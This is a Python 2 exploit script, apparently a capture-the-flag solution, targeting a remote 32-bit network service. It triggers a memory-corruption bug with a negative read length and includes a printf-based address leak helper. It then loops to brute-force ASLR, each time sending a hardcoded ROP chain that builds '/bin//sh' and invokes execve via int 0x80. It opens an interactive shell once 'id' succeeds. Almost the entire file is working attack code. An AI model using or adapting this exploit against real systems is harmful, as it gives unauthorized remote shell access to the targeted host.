#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

i = -1
while True:
	i += 1
	print '[i] i = %d' % i
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((sys.argv[1], int(sys.argv[2])))
		# s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)


		def recvuntil(t):
		    data = ''
		    while not data.endswith(t):
			tmp = s.recv(1)
			if not tmp: break
			data += tmp

		    return data

		def interactive():
		    t = telnetlib.Telnet()
		    t.sock = s
		    t.interact()

		recvuntil("read? ")
		s.send("-1\n")
		recvuntil("data!\n")

		def leak(addr):
			out = ''
			out += p32(0x08048370) # printf
			out += p32(0x0804864e) # pop pop
			out += p32(0x8048702) # %s
			out += p32(addr) # address
			out += p32(0x08048370) # printf
			out += p32(0x0804835d) # pop
			out += p32(0x80486c8) # \n
			return out

                # we can use the leak function to leak some addresses like
                # printf and others and find out the libc used on the server

                # having the libc, you can do ret2libc/ROP on it. Since there
                # is ASLR we just bruteforced, hoping to get again the same
                # addresses soon

		p = ''

		p += pack('<I', 0xb755daa2) # pop edx ; ret
		p += pack('<I', 0xb7706040) # @ .data
		p += pack('<I', 0xb758069f) # pop eax ; ret
		p += '/bin'
		p += pack('<I', 0xb7602a2c) # mov dword ptr [edx], eax ; ret
		p += pack('<I', 0xb755daa2) # pop edx ; ret
		p += pack('<I', 0xb7706044) # @ .data + 4
		p += pack('<I', 0xb758069f) # pop eax ; ret
		p += '//sh'
		p += pack('<I', 0xb7602a2c) # mov dword ptr [edx], eax ; ret
		p += pack('<I', 0xb755daa2) # pop edx ; ret
		p += pack('<I', 0xb7706048) # @ .data + 8
		p += pack('<I', 0xb758b06c) # xor eax, eax ; ret
		p += pack('<I', 0xb7602a2c) # mov dword ptr [edx], eax ; ret
		p += pack('<I', 0xb75758ce) # pop ebx ; ret
		p += pack('<I', 0xb7706040) # @ .data
		p += pack('<I', 0xb758a3cb) # pop ecx ; pop edx ; ret
		p += pack('<I', 0xb7706048) # @ .data + 8
		p += pack('<I', 0x41414141) # padding
		p += pack('<I', 0xb755daa2) # pop edx ; ret
		p += pack('<I', 0xb7706048) # @ .data + 8
		p += pack('<I', 0xb758b06c) # xor eax, eax ; ret
		p += pack('<I', 0xb75835f2) # inc eax ; ret
		p += pack('<I', 0xb75835f2) # inc eax ; ret
		p += pack('<I', 0xb75835f2) # inc eax ; ret
		p += pack('<I', 0xb75835f2) # inc eax ; ret
		p += pack('<I', 0xb75835f2) # inc eax ; ret
		p += pack('<I', 0xb75835f2) # inc eax ; ret
		p += pack('<I', 0xb75835f2) # inc eax ; ret
		p += pack('<I', 0xb75835f2) # inc eax ; ret
		p += pack('<I', 0xb75835f2) # inc eax ; ret
		p += pack('<I', 0xb75835f2) # inc eax ; ret
		p += pack('<I', 0xb75835f2) # inc eax ; ret
		p += pack('<I', 0xb758a6a5) # int 0x80

		s.send("I"*48 + p + '\n')
		recvuntil('\n')
		s.send('id\n')
		t = s.recv(1024)
		if 'uid' in t:
			print "[+] Interactive shell"
                        interactive()
                        sys.exit(0)

		s.close()
	except:
		continue
